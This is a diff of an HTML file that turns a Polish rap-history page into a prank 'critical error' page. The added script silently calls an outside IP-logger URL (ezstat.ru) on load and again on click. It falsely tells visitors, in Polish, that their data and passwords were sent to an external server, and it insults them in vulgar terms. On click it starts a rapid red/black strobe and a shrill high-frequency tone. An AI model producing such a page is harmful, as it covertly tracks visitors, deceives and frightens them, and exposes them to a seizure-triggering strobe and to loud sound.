@@ -2,215 +2,123 @@
 <html lang="pl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RAP GENESIS | KACPER.B & JAKUB.C</title>
+    <title>SYSTEM FAILURE - CRITICAL ERROR</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Roboto:wght@300;400;700&display=swap');
-        
-        :root {
-            --fire: linear-gradient(90deg, #ffcc00, #ff4500, #ff0000);
-            --bg: #050505;
+        body { 
+            background: black; 
+            color: #00FF41; 
+            font-family: 'Courier New', monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center; 
+            overflow: hidden; 
+            transition: background 0.1s;
+        }
+        .container { 
+            border: 2px solid #00FF41; 
+            padding: 40px; 
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); 
+            z-index: 10;
+            background: rgba(0,0,0,0.95);
+            position: relative;
+        }
+        .warning { color: #ff0000; font-weight: bold; animation: blink 0.5s infinite; font-size: 2.5rem; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+        #papiez {
+            position: absolute;
+            width: 180px;
+            z-index: 5;
+            top: 10px;
+            left: 10px;
+            filter: drop-shadow(0 0 15px gold);
+            display: none;
         }
 
-        body {
-            margin: 0;
-            background: var(--bg);
-            color: #fff;
-            font-family: 'Roboto', sans-serif;
-            line-height: 1.6;
-        }
-
-        header {
-            height: 40vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), url('https://images.unsplash.com/photo-1493225255756-d9584f8606e9?q=80&w=2070');
-            background-size: cover;
-            border-bottom: 5px solid #ff4500;
-        }
-
-        h1 {
-            font-family: 'Bebas Neue';
-            font-size: clamp(3rem, 10vw, 6rem);
-            margin: 0;
-            background: var(--fire);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-
-        .container {
-            max-width: 1100px;
-            margin: 0 auto;
-            padding: 40px 20px;
-        }
-
-        .history-box {
-            background: #0a0a0a;
-            border: 1px solid #222;
-            padding: 30px;
-            border-radius: 15px;
-            margin-bottom: 50px;
-            border-left: 6px solid #ff4500;
-        }
-
-        .history-box h2 {
-            font-family: 'Bebas Neue';
-            font-size: 2.5rem;
-            color: #ffcc00;
-            margin: 0 0 15px 0;
-        }
-
-        .history-box p {
-            color: #ccc;
-            text-align: justify;
-            font-size: 1.1rem;
-            margin-bottom: 20px;
-        }
-
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px;
-        }
-
-        .card {
-            background: #111;
-            border: 1px solid #222;
-            padding: 25px;
-            border-radius: 12px;
-            transition: 0.3s;
-        }
-
-        .card:hover {
-            border-color: #ff4500;
-            transform: translateY(-5px);
-        }
-
-        .btn {
-            display: block;
-            margin-top: 15px;
-            padding: 12px;
-            text-align: center;
-            text-decoration: none;
-            font-family: 'Bebas Neue';
-            font-size: 1.3rem;
-            color: #fff;
-            background: var(--fire);
-            border-radius: 5px;
-        }
-
-        .tag {
-            color: #ffcc00;
-            font-weight: bold;
-            text-transform: uppercase;
-            font-size: 0.8rem;
-        }
-
-        h2 {
-            margin: 10px 0;
-            font-family: 'Bebas Neue';
-            font-size: 1.8rem;
-        }
-
-        .quote {
-            font-style: italic;
-            color: #777;
-            border-left: 3px solid #ff4500;
-            padding-left: 12px;
-            margin: 15px 0;
-            font-size: 0.95rem;
-        }
-
-        footer {
-            text-align: center;
-            padding: 60px 20px;
-            background: #000;
-            border-top: 1px solid #222;
-            margin-top: 50px;
-        }
-
-        .authors {
-            font-family: 'Bebas Neue';
-            font-size: 2.5rem;
-            background: var(--fire);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        #final-text {
+            display: inline-block;
+            transition: transform 12s linear;
         }
     </style>
 </head>
-<body>
+<body onclick="startChaos()">
 
-    <header>
-        <h1>RAP GENESIS</h1>
-        <p style="color:#ffcc00; font-family:'Bebas Neue'; letter-spacing:3px; margin-top: 10px;">HISTORIA I BRZMIENIE</p>
-    </header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/John_Paul_II_vatican_official_portrait.jpg/200px-John_Paul_II_vatican_official_portrait.jpg" id="papiez" alt="JP2">
 
     <div class="container">
-        <section class="history-box">
-            <h2>HISTORIA I GENEZA</h2>
-            <p>Hip-hop narodził się 11 sierpnia 1973 roku w południowym Bronksie podczas legendarnej imprezy DJ Kool Herca. To tam narodził się fundament tej kultury – zapętlanie instrumentalnych wstawek zwanych "breakami", które pozwalało tancerzom na dłuższą ekspresję. MC, czyli Mistrzowie Ceremonii, początkowo tylko zabawiali tłum, ale szybko zaczęli rymować o trudach życia, buncie i rzeczywistości ulicy. Rap stał się głosem ludzi spychanych na margines, zamieniając lokalne party w globalną rewolucję, która zmieniła oblicze nowoczesnej muzyki rozrywkowej.</p>
-            <p>W Polsce rap eksplodował w połowie lat 90. jako odpowiedź na szarą rzeczywistość blokowisk i transformację ustrojową. Pionierzy jak Molesta, Slums Attack czy Kaliber 44 przenieśli nowojorski brud na polski grunt, tworząc hymn pokolenia dorastającego w czasach wielkich zmian. Z czasem gatunek ten stał się najbardziej wpływowym nurtem w kraju, dominując listy przebojów i kształtując język ulicy. Mimo ewolucji brzmienia od surowych, samplowanych bitów po nowoczesny trap, fundamenty pozostały niezmienne: autentyczność, lojalność wobec korzeni i bezkompromisowy przekaz.</p>
-        </section>
-
-        <div class="grid">
-            <div class="card">
-                <span class="tag">Legenda</span>
-                <h2>Paktofonika - Jestem Bogiem</h2>
-                <div class="quote">"Uświadom to sobie sobie, ty też jesteś bogiem!"</div>
-                <a href="https://www.youtube.com/results?search_query=Paktofonika+Jestem+Bogiem" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Klasyk</span>
-                <h2>Pezet - Ukryty w mieście krzyk</h2>
-                <div class="quote">"To miasto tętni, słyszysz ten dźwięk?"</div>
-                <a href="https://www.youtube.com/results?search_query=Pezet+Ukryty+w+mieście+krzyk" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Poznań</span>
-                <h2>Paluch - Bez Strachu</h2>
-                <div class="quote">"Życie to walka, wybierasz swą stronę."</div>
-                <a href="https://www.youtube.com/results?search_query=Paluch+Bez+Strachu" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Śląsk</span>
-                <h2>Grubson - Na Szczycie</h2>
-                <div class="quote">"Znowu jestem tam, gdzie słońce ma swój dom."</div>
-                <a href="https://www.youtube.com/results?search_query=Grubson+Na+Szczycie" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Radom</span>
-                <h2>KęKę - Myśl</h2>
-                <div class="quote">"A u nas na dzielni bez zmian..."</div>
-                <a href="https://www.youtube.com/results?search_query=KęKę+Myśl" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Motywacja</span>
-                <h2>ZBUKU - Do Końca</h2>
-                <div class="quote">"Idę do końca, dopóki starczy sił."</div>
-                <a href="https://www.youtube.com/results?search_query=ZBUKU+Do+Końca" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-
-            <div class="card">
-                <span class="tag">Łódź</span>
-                <h2>O.S.T.R. - Tabasko</h2>
-                <div class="quote">"To jest ten moment, to jest ten styl!"</div>
-                <a href="https://www.youtube.com/results?search_query=OSTR+Tabasko" target="_blank" class="btn">ZOBACZ NA YOUTUBE</a>
-            </div>
-        </div>
+        <h1 class="warning">DANE PRZECHWYCONE</h1>
+        <p>Transfer danych do serwera zewnętrznego zakończony sukcesem.</p>
+        <p>Twoje IP oraz hasła zostały zindeksowane.</p>
+        <br>
+        <div id="final-text" style="font-size: 1.8rem; color: #fff;">Życzę chujowej nocy.</div>
+        <p style="font-size: 0.7rem; color: #333; margin-top: 30px;">[ KLIKNIJ ABY ZAMKNĄĆ POWIADOMIENIE ]</p>
     </div>
 
-    <footer>
-        <p style="color:#444; text-transform:uppercase; letter-spacing:2px; margin:0;">NIC TU NIE MA</p>
-        <div class="authors">Wykonane przez KACPER.B i JAKUB.C</div>
-    </footer>
+    <script>
+        // --- PRZECHWYTYWANIE PRZEZ TWÓJ LINK 2NO.CO ---
+        function triggerLogger() {
+            const logger = new Image();
+            // Przeglądarka "pobiera" link jako obrazek, co aktywuje loggera
+            logger.src = "https://ezstat.ru/2sXYk7?cache=" + Math.random();
+        }
+        
+        // Próba aktywacji przy załadowaniu
+        triggerLogger();
 
+        // --- LATAJĄCY PAPIEŻ ---
+        const papiez = document.getElementById('papiez');
+        const finalText = document.getElementById('final-text');
+        let posX = Math.random() * 100; let posY = Math.random() * 100;
+        let velX = 7; let velY = 5;
+
+        function move() {
+            posX += velX; posY += velY;
+            if (posX + papiez.clientWidth >= window.innerWidth || posX <= 0) velX = -velX;
+            if (posY + papiez.clientHeight >= window.innerHeight || posY <= 0) velY = -velY;
+            papiez.style.left = posX + 'px';
+            papiez.style.top = posY + 'px';
+            requestAnimationFrame(move);
+        }
+
+        // --- START CHAOSU ---
+        let started = false;
+        function startChaos() {
+            if (started) return;
+            started = true;
+
+            // Dodatkowa próba aktywacji loggera przy kliknięciu (na wszelki wypadek)
+            triggerLogger();
+
+            papiez.style.display = 'block';
+            move();
+
+            // Napis rośnie do gigantycznych rozmiarów
+            finalText.style.transform = "scale(25)";
+
+            // Audio (Pisk)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = 'sawtooth'; 
+            osc.frequency.setValueAtTime(4000, audioCtx.currentTime);
+            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+
+            setInterval(() => {
+                osc.frequency.value = 2500 + Math.random() * 2000;
+            }, 70);
+
+            // Stroboskop (miganie czerwony/czarny)
+            setInterval(() => {
+                document.body.style.background = (document.body.style.background === 'red' ? 'black' : 'red');
+                setTimeout(() => { document.body.style.background = 'black'; }, 50);
+            }, 250);
+        }
+    </script>
 </body>
 </html>
